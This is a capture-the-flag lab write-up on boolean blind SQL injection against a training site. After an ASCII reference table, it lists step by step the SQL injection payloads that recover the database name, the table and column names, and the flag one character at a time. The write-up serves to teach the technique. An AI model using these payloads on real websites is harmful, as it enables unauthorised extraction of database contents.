# Lab 6.2.1 SQL Blind-Based Injection

## 0x00 Basic Knowledge

Some websites never show the query result on the webpage except TRUE or FALSE like boolean return. Sometimes just show data or not show data. In this type of scenarios, tersters are lacking of test data. 

So we may use [ASCII][3] to decode required data char by char. 
    
| Dec | Char                         | Dec | Char  | Dec | Char | Dec | Char |   
| --- | ---------------------------- | --- | ----- | --- | ---- | --- | ---- |    
|   0 | NUL (null)                   |  32 | SPACE |  64 | @    |  96 | `    |
|   1 | SOH (start of heading)       |  33 | !     |  65 | A    |  97 | a    |
|   2 | STX (start of text)          |  34 | "     |  66 | B    |  98 | b    |
|   3 | ETX (end of text)            |  35 | #     |  67 | C    |  99 | c    |
|   4 | EOT (end of transmission)    |  36 | $     |  68 | D    | 100 | d    |
|   5 | ENQ (enquiry)                |  37 | %     |  69 | E    | 101 | e    |
|   6 | ACK (acknowledge)            |  38 | &     |  70 | F    | 102 | f    |
|   7 | BEL (bell)                   |  39 | '     |  71 | G    | 103 | g    |
|   8 | BS  (backspace)              |  40 | (     |  72 | H    | 104 | h    |
|   9 | TAB (horizontal tab)         |  41 | )     |  73 | I    | 105 | i    |
|  10 | LF  (NL line feed, new line) |  42 | *     |  74 | J    | 106 | j    |
|  11 | VT  (vertical tab)           |  43 | +     |  75 | K    | 107 | k    |
|  12 | FF  (NP form feed, new page) |  44 | ,     |  76 | L    | 108 | l    |
|  13 | CR  (carriage return)        |  45 | -     |  77 | M    | 109 | m    |
|  14 | SO  (shift out)              |  46 | .     |  78 | N    | 110 | n    |
|  15 | SI  (shift in)               |  47 | /     |  79 | O    | 111 | o    |
|  16 | DLE (data link escape)       |  48 | 0     |  80 | P    | 112 | p    |
|  17 | DC1 (device control 1)       |  49 | 1     |  81 | Q    | 113 | q    |
|  18 | DC2 (device control 2)       |  50 | 2     |  82 | R    | 114 | r    |
|  19 | DC3 (device control 3)       |  51 | 3     |  83 | S    | 115 | s    |
|  20 | DC4 (device control 4)       |  52 | 4     |  84 | T    | 116 | t    |
|  21 | NAK (negative acknowledge)   |  53 | 5     |  85 | U    | 117 | u    |
|  22 | SYN (synchronous idle)       |  54 | 6     |  86 | V    | 118 | v    |
|  23 | ETB (end of trans. block)    |  55 | 7     |  87 | W    | 119 | w    |
|  24 | CAN (cancel)                 |  56 | 8     |  88 | X    | 120 | x    |
|  25 | EM  (end of medium)          |  57 | 9     |  89 | Y    | 121 | y    |
|  26 | SUB (substitute)             |  58 | :     |  90 | Z    | 122 | z    |
|  27 | ESC (escape)                 |  59 | ;     |  91 | [    | 123 | {    |
|  28 | FS  (file separator)         |  60 | <     |  92 | \    | 124 | |    |
|  29 | GS  (group separator)        |  61 | =     |  93 | ]    | 125 | }    |
|  30 | RS  (record separator)       |  62 | >     |  94 | ^    | 126 | ~    |
|  31 | US  (unit separator)         |  63 | ?     |  95 | _    | 127 | DEL  |  

## 0x01 Go Hack It

Lab site from [zkaq.org][1]

### [Home Page][2]

![](./imgs/0_home.jpg)

### Injection Point

Successfully login.

```sql
id=1'--+
```

![](./imgs/1_true.jpg)

```sql
id=1' AND 1=2--+
```

![](./imgs/1_false.jpg)

So all the rest testing process will only get the above 2 different pages  

### DATABASE()

```sql
id=1' AND (LENGTH(DATABASE()))=8--+
```

So database name length = 8

```sql
#security
id=1' AND (ASCII(SUBSTR(DATABASE(),1,1)))=115--+
id=1' AND (ASCII(SUBSTR(DATABASE(),2,1)))=101--+
id=1' AND (ASCII(SUBSTR(DATABASE(),3,1)))=99--+
id=1' AND (ASCII(SUBSTR(DATABASE(),4,1)))=117--+
id=1' AND (ASCII(SUBSTR(DATABASE(),5,1)))=114--+
id=1' AND (ASCII(SUBSTR(DATABASE(),6,1)))=105--+
id=1' AND (ASCII(SUBSTR(DATABASE(),7,1)))=116--+
id=1' AND (ASCII(SUBSTR(DATABASE(),8,1)))=121--+
```

So database name = **security**

### TABLE_NAME

#### emails

```sql
#emails
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 0,1),1,1)))=101--+
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 0,1),2,1)))=109--+
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 0,1),3,1)))=97--+
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 0,1),4,1)))=105--+
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 0,1),5,1)))=108--+
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 0,1),6,1)))=115--+
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 0,1),7,1)))=0--+
```

#### referers

```sql
#referers
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 1,1),1,1)))=114--+
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 1,1),2,1)))=101--+
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 1,1),3,1)))=102--+
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 1,1),4,1)))=101--+
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 1,1),5,1)))=114--+
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 1,1),6,1)))=101--+
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 1,1),7,1)))=114--+
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 1,1),8,1)))=115--+
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 1,1),9,1)))=0--+
```

#### uagents

```sql
#uagents
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 2,1),1,1)))=117--+
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 2,1),2,1)))=97--+
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 2,1),3,1)))=103--+
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 2,1),4,1)))=101--+
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 2,1),5,1)))=110--+
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 2,1),6,1)))=116--+
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 2,1),7,1)))=115--+
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 2,1),8,1)))=0--+
```

#### users

```sql
#users
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 3,1),1,1)))=117--+
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 3,1),2,1)))=115--+
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 3,1),3,1)))=101--+
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 3,1),4,1)))=114--+
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 3,1),5,1)))=115--+
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 3,1),6,1)))=0--+
```

#### **zkaq**

```sql
#zkaq
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 4,1),1,1)))=122--+
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 4,1),2,1)))=107--+
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 4,1),3,1)))=97--+
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 4,1),4,1)))=113--+
id=1' AND (ASCII(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 4,1),5,1)))=0--+
```

### COLUMN_NAME

#### flag

```sql
#flag
id=1' AND (ASCII(SUBSTR((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='zkaq' LIMIT 0,1),1,1)))=102--+
id=1' AND (ASCII(SUBSTR((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='zkaq' LIMIT 0,1),2,1)))=108--+
id=1' AND (ASCII(SUBSTR((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='zkaq' LIMIT 0,1),3,1)))=97--+
id=1' AND (ASCII(SUBSTR((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='zkaq' LIMIT 0,1),4,1)))=103--+
id=1' AND (ASCII(SUBSTR((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='zkaq' LIMIT 0,1),5,1)))=0--+
```

#### **zKaQ**

```sql
#zKaQ
id=1' AND (ASCII(SUBSTR((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='zkaq' LIMIT 1,1),1,1)))=122--+
id=1' AND (ASCII(SUBSTR((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='zkaq' LIMIT 1,1),2,1)))=75--+
id=1' AND (ASCII(SUBSTR((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='zkaq' LIMIT 1,1),3,1)))=97--+
id=1' AND (ASCII(SUBSTR((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='zkaq' LIMIT 1,1),4,1)))=81--+
id=1' AND (ASCII(SUBSTR((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='zkaq' LIMIT 1,1),5,1)))=0--+
```

### FLAG

```sql
#zKaQ-B1indB7s4d
id=1' AND (ASCII(SUBSTR((SELECT zKaQ FROM zkaq WHERE flag=5),1,1)))=122--+
id=1' AND (ASCII(SUBSTR((SELECT zKaQ FROM zkaq WHERE flag=5),2,1)))=75--+
id=1' AND (ASCII(SUBSTR((SELECT zKaQ FROM zkaq WHERE flag=5),3,1)))=97--+
id=1' AND (ASCII(SUBSTR((SELECT zKaQ FROM zkaq WHERE flag=5),4,1)))=81--+
id=1' AND (ASCII(SUBSTR((SELECT zKaQ FROM zkaq WHERE flag=5),5,1)))=45--+
id=1' AND (ASCII(SUBSTR((SELECT zKaQ FROM zkaq WHERE flag=5),6,1)))=66--+
id=1' AND (ASCII(SUBSTR((SELECT zKaQ FROM zkaq WHERE flag=5),7,1)))=49--+
id=1' AND (ASCII(SUBSTR((SELECT zKaQ FROM zkaq WHERE flag=5),8,1)))=105--+
id=1' AND (ASCII(SUBSTR((SELECT zKaQ FROM zkaq WHERE flag=5),9,1)))=110--+
id=1' AND (ASCII(SUBSTR((SELECT zKaQ FROM zkaq WHERE flag=5),10,1)))=100--+
id=1' AND (ASCII(SUBSTR((SELECT zKaQ FROM zkaq WHERE flag=5),11,1)))=66--+
id=1' AND (ASCII(SUBSTR((SELECT zKaQ FROM zkaq WHERE flag=5),12,1)))=55--+
id=1' AND (ASCII(SUBSTR((SELECT zKaQ FROM zkaq WHERE flag=5),13,1)))=115--+
id=1' AND (ASCII(SUBSTR((SELECT zKaQ FROM zkaq WHERE flag=5),14,1)))=52--+
id=1' AND (ASCII(SUBSTR((SELECT zKaQ FROM zkaq WHERE flag=5),15,1)))=100--+
id=1' AND (ASCII(SUBSTR((SELECT zKaQ FROM zkaq WHERE flag=5),16,1)))=0--+
```

[1]: https://hack.zkaq.org/?a=battle&f=target&id=146a23157875b3d8
[2]: http://120.203.13.75:8150/New/BlindBased/RankOne/sql-one/
[3]: https://www.cs.cmu.edu/~pattis/15-1XX/common/handouts/ascii.html
